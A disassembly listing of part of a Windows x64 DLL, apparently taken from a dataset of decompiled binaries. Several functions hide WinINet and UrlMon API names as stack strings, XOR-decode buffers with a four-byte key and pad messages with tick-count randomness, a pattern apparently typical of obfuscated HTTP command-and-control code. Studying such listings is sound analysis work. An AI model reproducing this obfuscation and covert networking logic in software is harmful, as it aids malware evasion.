mov r9 [ rcx + 0xe0 ]
mov r8 [ rcx + 0xd8 ]
lea rdx [ rsp + 0x60 ]
add rcx 0xd8
call sub_180005930
xor bl bl
mov rcx [ rdi + 0x10 ]
sub rcx [ rdi + 0x8 ]
mov r13 0x6666666666666667
mov rax r13
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
xor r12d r12d
add rdx rax
je r-xdata
lea rdx [ rbp + 0xd8 ]
mov rcx rbp
call sub_180019bd0
movzx ebp al
mov rbx [ rdi + 0x8 ]
test rbx rbx
je r-xdata
mov r8d r12d
mov [ rdi + 0x8 ] r12
mov [ rdi + 0x10 ] r12
mov [ rdi + 0x18 ] r12
movzx eax bpl
mov rbx [ rsp + 0x70 ]
add rsp 0x30
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rsi [ rdi + 0x10 ]
cmp rbx rsi
je r-xdata
lea rcx [ r8 + r8 * 4 ]
mov rax [ rdi + 0x8 ]
lea rdx [ rax + rcx * 8 ]
lea rcx [ rbp + 0xd8 ]
call sub_180009dd0
inc bl
movzx r8d bl
mov rcx [ rdi + 0x10 ]
sub rcx [ rdi + 0x8 ]
mov rax r13
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jb r-xdata
mov rcx [ rdi + 0x8 ]
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180019de0
push r12
sub rsp 0x40
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rbp
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov r12 r9
mov ebx r8d
mov rbp rdx
xor esi esi
mov [ rsp + 0x20 ] rsi
lea ecx [ rsi + 0x30 ]
call sub_18001c84c
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rdi rsi
mov rcx rax
call sub_180008850
mov rdi rax
jmp r-xdata
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180008890
mov rcx rdi
call j_sub_18001c80c
mov r8 rbx
lea r9 [ rsp + 0x20 ]
mov rdx rbp
mov rcx rdi
call sub_180008f60
mov rbx rax
test rdi rdi
je r-xdata
xor eax eax
cmp [ rsp + 0x20 ] 0x4
jb r-xdata
lea rcx [ rbx + 0x4 ]
mov r9 0xfffffffffffffffc
sub r9 rbx
mov r8d 0xf
nop [ rax ] eax
lea rax [ r9 + rcx ]
and eax 0x3
movzx eax [ rax + rbx ]
xor [ rcx ] al
inc rcx
dec r8
jne r-xdata
lea rax [ rw-data ]
mov ecx [ rax ]
cmp ecx [ rbx + 0x4 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov esi eax
movzx ecx [ rax + 0x4 ]
cmp cx [ rbx + 0x8 ]
jne r-xdata
mov eax [ rsp + 0x20 ]
add eax 0xfffffff5
mov [ r12 ] eax
mov edi eax
lea edx [ rsi + 0x1 ]
mov ecx eax
call sub_18001d210
mov rsi rax
test rax rax
je r-xdata
movzx ecx [ rax + 0x6 ]
cmp cl [ rbx + 0xa ]
je r-xdata
lea r8 [ rbx + 0xb ]
mov r9d edi
mov edx edi
mov rcx rax
call sub_18001d25c
mov rcx rbx
call sub_18001c80c
mov rax rsi
jmp r-xdata
test esi esi
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub_180019f30
push rdi
sub rsp 0x1e0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x1f8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1d0 ] rax
mov rdi rcx
mov ecx 0x202
lea rdx [ rsp + 0x30 ]
call WSAStartup
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov rcx rax
call sub_180008850
mov rbx rax
jmp r-xdata
mov dl 0x1
mov rcx rbx
call sub_180008990
lea rcx [ rdi + 0x18 ]
mov r9d 0x40
mov r8 [ rbx + 0x28 ]
mov edx r9d
call sub_18001d25c
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
mov al 0x1
mov rcx [ rsp + 0x1d0 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x1f8 ]
add rsp 0x1e0
pop rdi
retn
sub_18001a000
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov edx 0x1
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x8 ] 0x13
lea ecx [ rdx + 0x12 ]
call sub_18001d210
mov [ rbx + 0x10 ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001a040
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rdi rcx
mov ebx edx
mov [ rcx ] rax
mov rcx [ rcx + 0x10 ]
call sub_18001c80c
lea r11 [ r--data ]
mov [ rdi ] r11
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_18001a090
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push r13
sub rsp 0x20
mov rsi r8
mov r8 [ rcx + 0x10 ]
mov rbp r9
mov r13 rdx
mov rbx rcx
cmp r8 rdx
jb r-xdata
lea rcx [ r--data ]
call sub_18001c1d8
mov rax [ rsi + 0x10 ]
cmp rax r9
jb r-xdata
sub rax r9
mov [ rsp + 0x48 ] r12
mov r12 [ rsp + 0x60 ]
cmp rax r12
cmovb r12 rax
or rax 0xffffffffffffffff
sub rax r8
cmp rax r12
ja r-xdata
mov [ rsp + 0x40 ] rdi
test r12 r12
je r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop rsi
pop rbp
retn
lea rdi [ r8 + r12 ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_180003380
test rdi rdi
je r-xdata
mov rax [ rbx + 0x18 ]
cmp rax 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp rax 0x10
jb r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
cmp r13 rbp
jae r-xdata
mov r8 [ rbx + 0x10 ]
lea rdx [ rcx + r13 ]
lea rcx [ rax + r13 ]
sub r8 r13
add rcx r12
call sub_18001c4a0
cmp rbx rsi
jne r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsi ]
mov rax [ rbx + 0x18 ]
cmp rax 0x10
jb r-xdata
add rbp r12
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rdx [ rsi + rbp ]
lea rcx [ rax + r13 ]
mov r8 r12
call sub_18001c4a0
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp rax 0x10
jb r-xdata
mov [ rax + rdi ] 0x0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
lea rdx [ rcx + rbp ]
lea rcx [ rax + r13 ]
mov r8 r12
call sub_18001c4a0
jmp r-xdata
sub_18001a240
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x20
mov rax [ rdx + 0x10 ]
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
cmp rax r8
jae r-xdata
sub rax r8
mov r8 [ rcx + 0x10 ]
cmp rax r9
cmovb rbp rax
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
lea rcx [ r--data ]
call sub_18001c1d8
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rdi [ r8 + rbp ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_180003380
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsi ]
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
add rcx [ rbx + 0x10 ]
lea rdx [ rsi + r12 ]
mov r8 rbp
call sub_18001c4a0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_18001a360
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax r8
mov rbx rcx
sub rax rdx
mov rdi [ rcx + 0x10 ]
cmp rdi rax
ja r-xdata
xor esi esi
cmp [ rcx + 0x18 ] rax
je r-xdata
add rsp 0x30
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
movsx r12d [ rdx ]
mov r8 [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax r8
cmp rax 0x1
ja r-xdata
mov r8b 0x1
mov rdx rax
call sub_180001880
test al al
je r-xdata
lea rdi [ r8 + 0x1 ]
cmp rdi r13
jbe r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180001330
jmp r-xdata
mov r13 0x7ffffffffffffffe
nop [ rax + rax ] ax
xor esi esi
mov [ rax + rdi * 2 ] si
jmp r-xdata
mov rcx [ rbx + 0x10 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x10 ] rsi
cmp rax 0x8
jb r-xdata
test rdi rdi
je r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
inc [ rsp + 0x68 ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rcx * 2 ] r12w
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rax ] si
jmp r-xdata
mov rdx [ rsp + 0x68 ]
cmp rdx [ rsp + 0x70 ]
je r-xdata
mov [ rax + rdi * 2 ] si
sub_18001a4b0
push rbx
sub rsp 0x30
mov rax [ rdx + 0x18 ]
mov r10 r8
mov r8 [ rdx + 0x10 ]
mov r9 [ r10 + 0x10 ]
sub rax r8
mov r11 rdx
mov rbx rcx
mov [ rsp + 0x48 ] 0x0
cmp r9 rax
jbe r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r10
mov rcx r11
call sub_18001a240
mov rax [ r10 + 0x18 ]
sub rax r9
cmp rax r8
jb r-xdata
mov r8 rdx
xor r9d r9d
mov rcx r10
xor edx edx
mov [ rsp + 0x20 ] 0xffffffffffffffff
call sub_18001a090
jmp r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov rdx rax
mov rcx rbx
mov [ rbx ] 0x0
call sub_180009250
mov rax rbx
add rsp 0x30
pop rbx
retn
sub_18001a540
push rbx
sub rsp 0x20
mov rax r8
mov r10 rdx
mov rbx rcx
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
mov rcx r10
mov [ rsp + 0x30 ] 0x0
call sub_18001a240
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov rcx rbx
mov rdx rax
mov [ rbx ] 0x0
call sub_180009250
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001a590
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rsi r8
mov rbp rdx
mov rbx rcx
xor eax eax
mov [ rsp + 0x58 ] eax
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] rax
mov [ rcx ] al
mov [ rsp + 0x58 ] 0x1
mov rdx [ rdx + 0x10 ]
add rdx [ r8 + 0x10 ]
mov rdi [ rcx + 0x10 ]
cmp rdi rdx
ja r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbp
mov rcx rbx
call sub_18001a240
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
mov rcx rbx
call sub_18001a240
mov rax rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
cmp [ rcx + 0x18 ] rdx
je r-xdata
mov r8b 0x1
call sub_180003650
test al al
je r-xdata
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi ] 0x0
sub_18001a640
push rbx
sub rsp 0x30
mov rax r8
mov rbx rcx
mov r8 rdx
xor r9d r9d
xor edx edx
mov rcx rax
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x20 ] 0xffffffffffffffff
call sub_18001a090
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov rcx rbx
mov rdx rax
mov [ rbx ] 0x0
call sub_180009250
mov rax rbx
add rsp 0x30
pop rbx
retn
sub_18001a6a0
mov rax rsp
push rbp
push r12
push r13
lea rbp [ rax - 0x48 ]
sub rsp 0x130
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x28 ] rax
mov rsi rdx
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x28 ] rax
xor r13d r13d
test rax rax
je r-xdata
mov rbx r13
mov rcx rax
call sub_180008850
mov rbx rax
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rbp + 0x10 ] 0x70747448
mov [ rbp + 0x14 ] 0x52646441
mov [ rbp + 0x18 ] 0x65757165
mov [ rbp + 0x1c ] 0x65487473
mov [ rbp + 0x20 ] 0x72656461
mov [ rbp + 0x24 ] 0x5773
mov [ rbp + 0x26 ] 0x0
lea rdx [ rbp + 0x10 ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rdi rax
test rax rax
je r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088d0
mov r8d 0x90
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
mov [ rbp - 0x18 ] 0x696e6977
mov [ rbp - 0x14 ] 0x2e74656e
mov [ rbp - 0x10 ] 0x6c6c64
lea rcx [ rbp - 0x18 ]
call [ GetModuleHandleA@IAT ]
test rax rax
je r-xdata
mov rcx [ rbp + 0x28 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x130 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_1800092e0
nop
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov r9d 0x20000000
or r8d 0xffffffff
mov rdx rax
mov rcx rsi
call rdi
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov rax [ rax ]
mov r8d 0x40
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_1800092e0
nop
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
mov r9d 0x20000000
or r8d 0xffffffff
mov rdx rax
mov rcx rsi
call rdi
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov rax [ rax ]
mov r8d 0x3e
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_1800092e0
nop
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
mov r9d 0x20000000
or r8d 0xffffffff
mov rdx rax
mov rcx rsi
call rdi
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov rax [ rax ]
mov eax [ rw-data ]
mov [ rsp + 0x28 ] eax
mov ecx eax
mov edx 0x1
call sub_18001d210
mov r12 rax
mov [ rbp - 0x28 ] 0x4d6c7255
mov [ rbp - 0x24 ] 0x642e6e6f
mov [ rbp - 0x20 ] 0x6c6c
mov [ rbp - 0x1e ] 0x0
lea rcx [ rbp - 0x28 ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
mov [ rbp - 0x8 ] 0x6174624f
mov [ rbp - 0x4 ] 0x73556e69
mov [ rbp ] 0x67417265
mov [ rbp + 0x4 ] 0x53746e65
mov [ rbp + 0x8 ] 0x6e697274
mov [ rbp + 0xc ] 0x67
lea rdx [ rbp - 0x8 ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
lea rcx [ rbp - 0x28 ]
call [ LoadLibraryA@IAT ]
test rax rax
jne r-xdata
mov eax [ rsp + 0x28 ]
lea r8 [ rsp + 0x28 ]
mov rdx r12
xor ecx ecx
call rax
jmp r-xdata
mov r8d 0xa8
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_1800092e0
nop
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov r8d 0xd
lea rdx [ rw-data ]
call sub_1800088c0
mov r8d [ rsp + 0x28 ]
mov [ rsp + 0x78 ] 0xf
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x60 ] 0x0
mov rdx r12
lea rcx [ rsp + 0x60 ]
call sub_180009120
nop
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_180009450
nop
lea r8 [ rsp + 0x60 ]
mov rdx rax
lea rcx [ rbp - 0x50 ]
call sub_18001a4b0
nop
cmp [ rsp + 0x50 ] 0x10
jb r-xdata
mov r8d 0xa8
lea rdx [ rw-data ]
call sub_1800088c0
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_1800092e0
nop
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rcx rbx
test eax eax
je r-xdata
mov r9d 0x20000000
or r8d 0xffffffff
mov rdx rax
mov rcx rsi
call rdi
nop
mov rax [ rax ]
mov [ rsp + 0x50 ] 0xf
mov [ rsp + 0x48 ] r13
mov [ rsp + 0x38 ] 0x0
cmp [ rsp + 0x78 ] 0x10
jb r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
mov r9d 0x20000000
or r8d 0xffffffff
mov rdx rax
mov rcx rsi
call rdi
nop
jmp r-xdata
mov rax [ rax ]
mov rcx r12
call sub_18001c80c
mov rcx [ rsp + 0x38 ]
jmp r-xdata
mov [ rsp + 0x78 ] 0xf
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x60 ] 0x0
lea rdx [ rbp - 0x50 ]
mov r9 [ rbp - 0x50 ]
mov rcx [ rbp - 0x38 ]
cmp rcx 0x10
cmovae rdx r9
mov r8 [ rbp - 0x40 ]
add r8 rdx
lea rdx [ rbp - 0x50 ]
cmp rcx 0x10
cmovae rdx r9
mov [ rbp - 0x60 ] 0x7
mov [ rbp - 0x68 ] r13
mov [ rbp - 0x78 ] r13w
movzx r9d [ rsp + 0x20 ]
lea rcx [ rbp - 0x78 ]
call sub_18001a360
nop
lea rdx [ rbp - 0x78 ]
cmp [ rbp - 0x60 ] 0x8
cmovae rdx [ rbp - 0x78 ]
mov r9d 0x20000000
or r8d 0xffffffff
mov rcx rsi
call rdi
nop
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
call j_sub_18001c80c
cmp [ rbp - 0x38 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_18001c80c
nop
mov rcx [ rbp - 0x50 ]
sub_18001ab30
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rbp
mov ebx r9d
mov rsi r8
mov rbp rdx
mov [ rsp + 0x68 ] 0x0
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x28 ] rax
test rax rax
je r-xdata
xor edi edi
mov rcx rax
call sub_180008850
mov rdi rax
jmp r-xdata
mov rdi [ rsp + 0x58 ]
mov edx 0x1
lea rcx [ rdi + 0x1 ]
call sub_18001d210
mov rsi rax
mov r9 rdi
mov r8 r12
lea rdx [ rdi + 0x1 ]
mov rcx rax
call sub_18001d25c
mov rcx r12
call sub_18001c80c
mov [ rbp + 0x18 ] 0xf
mov [ rbp + 0x10 ] 0x0
mov [ rbp ] 0x0
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rsi
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rsi
mov rcx rbp
call sub_180009120
mov rcx rsi
call sub_18001c80c
mov rax rbp
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov rcx rdi
call sub_180008890
mov rcx rdi
call j_sub_18001c80c
mov r8 rbx
lea r9 [ rsp + 0x58 ]
mov rdx rsi
mov rcx rdi
call sub_180008fd0
mov r12 rax
test rdi rdi
je r-xdata
sub_18001ac30
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov edi r8d
xor r14d r14d
mov rsi rdx
mov r13 rcx
lea rcx [ rdi + 0x1 ]
lea edx [ r14 + 0x1 ]
mov [ rsp + 0x60 ] r14d
mov r12d r8d
call sub_18001d210
mov rbp rax
test edi edi
je r-xdata
or rcx 0xffffffffffffffff
mov [ rsi + 0x18 ] 0xf
mov [ rsi + 0x10 ] r14
xor eax eax
mov [ rsi ] r14b
mov rdi rbp
[ rdi ]
mov rdx rbp
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rsi
call sub_180009120
mov rcx rbp
call sub_18001c80c
mov rbp [ rsp + 0x58 ]
mov rax rsi
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x50 ] rbx
mov rbx rax
mov [ rsp + 0x60 ] r14d
call [ GetTickCount@IAT ]
mov edi eax
call sub_18001d408
lea ecx [ rax + rdi ]
call sub_18001d3f0
lea rcx [ rsp + 0x60 ]
call sub_18001d2ec
mov edx [ rsp + 0x60 ]
inc rbx
and edx 0x3f
dec r12
movsxd rax edx
mov [ rsp + 0x60 ] edx
movzx ecx [ rax + r13 + 0x18 ]
mov [ rbx - 0x1 ] cl
jne r-xdata
mov rbx [ rsp + 0x50 ]
sub_18001ad10
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x70
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r12 r9
mov esi r8d
mov rdi rdx
mov rbp rcx
xor ebx ebx
mov [ rsp + 0x20 ] rbx
lea ecx [ rbx + 0x30 ]
call sub_18001c84c
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov r8 rsi
lea r9 [ rsp + 0x20 ]
mov rdx rdi
mov rcx rbx
call sub_180008fd0
mov rsi rax
test rbx rbx
je r-xdata
mov rcx rax
call sub_180008850
mov rbx rax
mov r8d [ rw-data ]
lea rdx [ rsp + 0x38 ]
mov rcx rbp
call sub_18001ac30
mov rdi [ rsp + 0x48 ]
mov eax [ rsp + 0x20 ]
lea ecx [ rdi + rax ]
mov [ r12 ] ecx
mov edx 0x1
call sub_18001d210
mov rbx rax
test rax rax
jne r-xdata
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
lea r8 [ rsp + 0x38 ]
cmp [ rsp + 0x50 ] 0x10
cmovae r8 [ rsp + 0x38 ]
mov r9 rdi
mov rdx rdi
mov rcx rax
call sub_18001d25c
mov rcx [ rsp + 0x48 ]
add rcx rbx
mov rdx [ rsp + 0x20 ]
mov r9 rdx
mov r8 rsi
call sub_18001d25c
mov rcx rsi
call sub_18001c80c
cmp [ rsp + 0x50 ] 0x10
jb r-xdata
cmp [ rsp + 0x50 ] 0x10
jb r-xdata
mov rax rbx
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
xor eax eax
jmp r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x70
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_18001ae50
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov ebp r8d
mov r14 rdx
mov r13 rcx
lea esi [ rbp + 0xb ]
mov edx 0x1
mov r12 r9
mov ecx esi
call sub_18001d210
mov rdi rax
test rax rax
jne r-xdata
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] 0x0
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
lea ecx [ rax + rbx ]
call sub_18001d3f0
lea rcx [ rsp + 0x60 ]
call sub_18001d2ec
mov ecx [ rsp + 0x60 ]
xor edx edx
or r8d 0xffffffff
mov eax ecx
mov r9d 0x7
div r8d
lea rbx [ rdi + 0x4 ]
lea r8 [ rw-data ]
add eax ecx
mov rcx rbx
mov edx r9d
mov [ rdi ] eax
call sub_18001d25c
lea rcx [ rdi + 0xb ]
mov rdx rbp
mov r9 rbp
mov r8 r14
call sub_18001d25c
mov rdx 0xfffffffffffffffc
mov ecx 0xf
sub rdx rdi
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
lea rax [ rdx + rbx ]
inc rbx
and eax 0x3
movzx eax [ rax + rdi ]
xor [ rbx - 0x1 ] al
dec rcx
jne r-xdata
mov r9 r12
mov r8d esi
mov rdx rdi
mov rcx r13
call sub_18001ad10
mov rcx rdi
mov rbx rax
call sub_18001c80c
mov rbp [ rsp + 0x58 ]
mov rax rbx
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
sub_18001af60
mov r11 rsp
push rsi
push rdi
push r12
sub rsp 0x90
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ r11 + 0x18 ] rbx
mov [ r11 + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x88 ] rax
mov rdi r8
mov rsi rdx
mov rbp rcx
mov [ r11 - 0x78 ] rdx
xor r12d r12d
mov [ rsp + 0x24 ] r12d
mov [ rsp + 0x20 ] r12d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
lea ecx [ rax + rbx ]
call sub_18001d3f0
lea rcx [ rsp + 0x20 ]
call sub_18001d2ec
xor edx edx
mov ecx [ rsp + 0x20 ]
mov eax ecx
or r8d 0xffffffff
div r8d
add ecx eax
mov rax [ rbp + 0x10 ]
mov [ rax ] ecx
mov rcx [ rbp + 0x10 ]
add rcx 0x4
mov r9d 0x7
lea r8 [ rw-data ]
mov edx r9d
call sub_18001d25c
mov r11 [ rbp + 0x10 ]
mov [ r11 + 0xb ] rdi
xor r8b r8b
cmp [ rbp + 0x8 ] 0x4
je r-xdata
mov r9d [ rbp + 0x8 ]
mov r8 [ rbp + 0x10 ]
mov rdx rsi
mov rcx rbp
call sub_18001ab30
mov [ rsp + 0x24 ] 0x1
mov r8d [ rw-data ]
lea rdx [ rsp + 0x60 ]
mov rcx rbp
call sub_18001ac30
nop
mov r8 rsi
mov rdx rax
lea rcx [ rsp + 0x38 ]
call sub_18001a540
mov rbx rax
cmp rsi rax
je r-xdata
mov edx r12d
nop [ rax + rax ] ax
cmp [ rsp + 0x50 ] 0x10
jb r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
